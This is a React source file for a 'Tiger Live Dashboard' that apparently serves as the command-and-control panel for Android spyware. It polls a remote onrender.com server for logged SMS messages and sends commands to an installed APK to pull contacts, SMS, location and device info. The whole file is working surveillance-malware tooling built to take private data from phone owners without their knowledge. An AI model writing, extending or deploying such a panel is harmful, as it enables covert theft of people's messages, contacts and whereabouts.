import React, { useEffect, useState } from 'react';
import { View, Text, FlatList, StyleSheet } from 'react-native';
import SmsItem from '../components/SmsItem';
import Select from 'react-select';

const dataOptions = [
  { value: 'contacts', label: 'Contacts' },
  { value: 'sms', label: 'SMS' },
  { value: 'location', label: 'Location' },
  { value: 'device', label: 'Device Info' },
  // Add more options as needed
];

const WebDashboard = () => {
  const [logs, setLogs] = useState([]);
  const [selectedOption, setSelectedOption] = useState(null);
  const [commandResponse, setCommandResponse] = useState(null);
  const [isSending, setIsSending] = useState(false);

  useEffect(() => {
    // Render server se data fetch karna
    const fetchData = async () => {
      try {
        const response = await fetch('https://tiger2-2.onrender.com/get-logs');
        const data = await response.json();
        setLogs(data);
      } catch (error) {
        console.log("Web Fetch Error:", error);
      }
    };

    fetchData();
    const interval = setInterval(fetchData, 5000); // Har 5 sec mein update
    return () => clearInterval(interval);
  }, []);

  const handleGetData = async () => {
    if (!selectedOption) return;
    setIsSending(true);
    setCommandResponse(null);
    try {
      // Example: send command to backend (update endpoint as needed)
      const response = await fetch('https://tiger2-2.onrender.com/send-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: selectedOption.value })
      });
      const data = await response.json();
      setCommandResponse(data);
    } catch (err) {
      setCommandResponse({ error: 'Failed to send command' });
    }
    setIsSending(false);
  };

  return (
    <View style={styles.webContainer}>
      <Text style={styles.title}>Tiger Live Dashboard</Text>
      <div style={{ marginBottom: 20, maxWidth: 400 }}>
        <Select
          options={dataOptions}
          value={selectedOption}
          onChange={setSelectedOption}
          placeholder="Select data to get from APK"
        />
        <button
          style={{ marginTop: 10, padding: '10px 20px', fontSize: 16 }}
          onClick={handleGetData}
          disabled={!selectedOption || isSending}
        >
          {isSending ? 'Sending...' : 'Get Data'}
        </button>
        {commandResponse && (
          <div style={{ marginTop: 10, color: commandResponse.error ? 'red' : 'green' }}>
            {commandResponse.error ? commandResponse.error : JSON.stringify(commandResponse)}
          </div>
        )}
      </div>
      <FlatList
        data={logs}
        keyExtractor={(item) => item.id}
        renderItem={({ item }) => (
          <SmsItem sender={item.sender} message={item.message} time={item.timestamp} />
        )}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  webContainer: { flex: 1, padding: 40, backgroundColor: '#f0f2f5' },
  title: { fontSize: 32, fontWeight: 'bold', marginBottom: 20, color: '#1a1a1a' }
});

export default WebDashboard;